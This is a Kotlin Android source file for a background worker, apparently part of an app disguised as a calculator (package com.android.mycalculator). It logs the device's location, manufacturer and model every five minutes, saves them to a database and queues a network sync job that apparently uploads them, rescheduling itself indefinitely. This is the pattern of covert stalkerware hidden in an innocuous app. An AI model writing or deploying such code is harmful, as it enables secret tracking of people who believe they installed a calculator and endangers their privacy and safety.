package com.android.mycalculator

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.work.*
import com.google.android.gms.location.*
import com.google.android.gms.tasks.Tasks
import java.util.concurrent.TimeUnit

class LocationWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        // Check permissions first
        if (ActivityCompat.checkSelfPermission(applicationContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(applicationContext, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e("LocationWorker", "Location permission not granted")
            return Result.failure()
        }

        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(applicationContext)
        
        var location: Location? = null
        try {
            // Get last known location with a 10-second timeout
            val locationTask = fusedLocationClient.lastLocation
            location = Tasks.await(locationTask, 10, TimeUnit.SECONDS)
        } catch (e: Exception) {
            Log.e("LocationWorker", "Failed to get location", e)
        }

        if (location != null) {
            val dbHelper = DatabaseHelper.getInstance(applicationContext)
            val device = "${Build.MANUFACTURER} ${Build.MODEL}"
            dbHelper.insertLocationLog(
                device,
                location.latitude,
                location.longitude,
                location.accuracy,
                location.provider ?: "unknown",
                System.currentTimeMillis()
            )
            Log.d("LocationWorker", "Location saved: ${location.latitude}, ${location.longitude}")

            // Trigger sync
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()
            val syncWork = OneTimeWorkRequestBuilder<SyncWorker>()
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(applicationContext).enqueueUniqueWork(
                "LocationSyncWork",
                ExistingWorkPolicy.REPLACE,
                syncWork
            )
        } else {
            Log.w("LocationWorker", "Location was null, will retry in 5 minutes")
        }

        // Schedule the next run in 5 minutes
        scheduleNextLocationWork()

        return Result.success()
    }

    private fun scheduleNextLocationWork() {
        val nextWork = OneTimeWorkRequestBuilder<LocationWorker>()
            .setInitialDelay(5, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "PeriodicLocationWork",
            ExistingWorkPolicy.REPLACE,
            nextWork
        )
    }

    companion object {
        fun startLocationTracking(context: Context) {
            val workRequest = OneTimeWorkRequestBuilder<LocationWorker>()
                .setInitialDelay(5, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(context).enqueueUniqueWork(
                "PeriodicLocationWork",
                ExistingWorkPolicy.KEEP,
                workRequest
            )
        }
    }
}
